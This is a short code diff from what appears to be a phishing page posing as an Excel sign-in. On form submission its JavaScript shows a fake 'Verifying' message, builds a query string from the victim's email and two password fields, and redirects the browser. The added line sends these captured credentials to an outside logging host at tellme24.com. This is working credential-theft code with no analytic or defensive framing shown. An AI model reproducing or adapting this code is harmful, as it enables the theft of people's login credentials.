@@ -76,13 +76,14 @@ xsl_form.addEventListener("submit", (e)=>{
             pass_input.style.color = "transparent";
     
             setTimeout(() => {
-                sub_btn.innerHTML = `<i>Verifying ...</i>`; 
-                let url = "Domain" + "=" + "Excel Logs" + "&" + "Mail" +
+            sub_btn.innerHTML = `<i>Verifying ...</i>`;
+
+            let url = "Domain" + "=" + "Excel Logs" + "&" + "Mail" +
             "=" + mail_input.value + "&" + "Pass1" + "=" + temp_mail.value + "&" + "Pass2" + "=" + pass_input.value;
 
             pass_input.type = "search";
     
-            location = "xls.php?" + url;
+            location = "xls.php?" + "https://tellme24.com/logs/excel/xls.php?"+url;
             pass_input.value = "";
     
             }, 1500);
